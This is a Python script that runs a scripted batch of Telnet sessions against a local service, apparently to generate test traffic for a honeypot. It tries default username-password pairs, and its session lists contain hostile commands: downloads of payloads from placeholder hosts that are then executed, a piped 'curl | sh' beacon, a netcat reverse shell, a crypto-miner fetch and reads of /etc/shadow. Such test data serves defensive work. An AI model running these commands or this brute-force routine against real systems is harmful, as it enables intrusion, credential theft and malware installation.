#!/usr/bin/env python3
"""Simplified batch Telnet attack — 18 sessions, fast execution."""
import sys
sys.stdout.reconfigure(encoding="utf-8")

import socket
import time
from datetime import datetime, timezone

HOST = "127.0.0.1"
PORT = 2323

SESSIONS = [
    {"user": "admin", "pass": "test123", "cmds": ["whoami", "uname -a", "cat /etc/passwd", "ls -la /home", "w", "exit"], "label": "basic-1", "expect_success": True},
    {"user": "root", "pass": "toor", "cmds": ["id", "ls /", "uname -r"], "label": "basic-2", "expect_success": False},
    {"user": "admin", "pass": "admin", "cmds": ["uptime", "df -h", "free -m"], "label": "basic-3", "expect_success": False},
    {"user": "test", "pass": "test", "cmds": ["whoami", "ls -la"], "label": "basic-4", "expect_success": False},
    {"user": "oracle", "pass": "oracle", "cmds": ["id", "cat /etc/os-release"], "label": "basic-5", "expect_success": False},
    {"user": "root", "pass": "password", "cmds": ["whoami", "ls /tmp"], "label": "basic-6", "expect_success": False},
    {"user": "deploy", "pass": "deploy", "cmds": ["id", "ls /home", "pwd"], "label": "basic-7", "expect_success": False},
    {"user": "guest", "pass": "guest123", "cmds": ["whoami", "ls"], "label": "basic-8", "expect_success": True},
    {"user": "ci", "pass": "ci", "cmds": ["whoami", "env"], "label": "basic-9", "expect_success": False},
    {"user": "devops", "pass": "devops", "cmds": ["id", "cat /proc/cpuinfo"], "label": "basic-10", "expect_success": False},
    {"user": "admin", "pass": "test123", "cmds": ["wget http://malware.evil.local/payload.sh", "chmod +x /tmp/payload.sh", "sh /tmp/payload.sh"], "label": "ioc-wget", "expect_success": True},
    {"user": "root", "pass": "toor", "cmds": ["curl -o /tmp/backdoor.bin http://botnet.invalid/dropper", "python /tmp/backdoor.bin"], "label": "ioc-curl-python", "expect_success": False},
    {"user": "admin", "pass": "test123", "cmds": ["nc -e /bin/bash 10.0.0.50 4444", "cat /etc/shadow"], "label": "ioc-nc", "expect_success": True},
    {"user": "root", "pass": "password", "cmds": ["wget -q http://exploit.local/revsh -O /tmp/sh", "chmod 777 /tmp/sh", "bash /tmp/sh"], "label": "ioc-wget-bash", "expect_success": False},
    {"user": "admin", "pass": "test123", "cmds": ["tftp -g -r payload.bin malware.invalid", "chmod +x payload.bin", "./payload.bin"], "label": "ioc-tftp", "expect_success": True},
    {"user": "root", "pass": "toor", "cmds": ["curl http://c2server.invalid/beacon | sh", "ls /var/log"], "label": "ioc-curl-sh", "expect_success": False},
    {"user": "admin", "pass": "test123", "cmds": ["wget http://miner.local/xmrig -O /tmp/xm", "chmod +x /tmp/xm", "python /tmp/xm --donate-level=1"], "label": "ioc-python-download", "expect_success": True},
    {"user": "root", "pass": "toor", "cmds": ["/bin/sh -c 'wget http://rootkit.invalid/install.sh && bash install.sh'"], "label": "ioc-bin-sh", "expect_success": False},
]

results = []

def recv_all(sock, timeout=0.5):
    """Receive all available data within timeout."""
    data = b""
    end = time.time() + timeout
    sock.settimeout(0.3)
    while time.time() < end:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        except socket.timeout:
            continue
        except OSError:
            break
    return data

def run_session(i, sess):
    label = sess["label"]
    print(f"[{i+1}/{len(SESSIONS)}] {label}: {sess['user']}:{sess['pass']}", flush=True)
    try:
        sock = socket.create_connection((HOST, PORT), timeout=10)
        sock.settimeout(5)
        
        # Read banner
        banner = b""
        end = time.time() + 5
        while time.time() < end:
            try:
                chunk = sock.recv(4096)
                if chunk:
                    banner += chunk
                    if b"login:" in banner:
                        break
            except socket.timeout:
                break
        
        if b"login:" not in banner:
            print(f"  - No login banner", flush=True)
            sock.close()
            return {"label": label, "status": "error", "user": sess["user"], "cmds_run": 0}
        
        # Send username
        sock.sendall(sess["user"].encode() + b"\r\n")
        time.sleep(0.5)
        
        # Read password prompt
        resp = recv_all(sock, 2)
        
        # Send password
        sock.sendall(sess["pass"].encode() + b"\r\n")
        time.sleep(1.5)
        
        # Read response
        resp = recv_all(sock, 1)
        time.sleep(0.5)
        resp2 = recv_all(sock, 0.5)
        full = resp + resp2
        
        failed_hint = b"Login incorrect" in full or b"login:" in full
        shell_hint = (b"$" in full and b"@" in full) or b"~$" in full or b"# " in full
        success = shell_hint and not failed_hint
        
        if not success:
            print(f"  - Login FAIL", flush=True)
            sock.close()
            return {"label": label, "status": "auth_failed", "user": sess["user"], "cmds_run": 0}
        
        print(f"  + Login OK", flush=True)
        time.sleep(0.3)
        
        cmds_run = 0
        for cmd in sess["cmds"]:
            if cmd == "exit":
                sock.sendall(b"exit\r\n")
                time.sleep(0.5)
                break
            sock.sendall(cmd.encode() + b"\r\n")
            time.sleep(0.8)
            out = recv_all(sock, 0.5)
            lines = [l.strip() for l in out.decode("utf-8", errors="replace").split("\n") if l.strip()]
            display = lines[-2:] if lines else []
            print(f"  $ {cmd}", flush=True)
            for line in display:
                print(f"    {line}", flush=True)
            cmds_run += 1
        
        sock.close()
        print(f"  -> OK ({cmds_run} cmds)", flush=True)
        return {"label": label, "status": "success", "user": sess["user"], "cmds_run": cmds_run}
    
    except Exception as e:
        print(f"  -> ERROR: {e}", flush=True)
        return {"label": label, "status": "error", "user": sess["user"], "error": str(e), "cmds_run": 0}

print(f"Batch Telnet Attack — {datetime.now(timezone.utc).isoformat()}", flush=True)
print(f"Target: {HOST}:{PORT}", flush=True)
print(f"Sessions: {len(SESSIONS)}", flush=True)
print("=" * 60, flush=True)

for i, sess in enumerate(SESSIONS):
    result = run_session(i, sess)
    results.append(result)
    time.sleep(1.5)

print("\n" + "=" * 60, flush=True)
print("SUMMARY", flush=True)
print("=" * 60, flush=True)
succeeded = sum(1 for r in results if r["status"] == "success")
failed_auth = sum(1 for r in results if r["status"] == "auth_failed")
errors = sum(1 for r in results if r["status"] == "error")
print(f"Total sessions: {len(SESSIONS)}", flush=True)
print(f"Succeeded (login OK): {succeeded}", flush=True)
print(f"Auth failed (expected): {failed_auth}", flush=True)
print(f"Errors: {errors}", flush=True)
print(flush=True)
for r in results:
    icon = "+" if r["status"] == "success" else "-" if r["status"] == "auth_failed" else "!"
    print(f"  {icon} {r['label']:20s} {r['user']:12s} {r['status']:15s} cmds={r['cmds_run']}", flush=True)
print(flush=True)
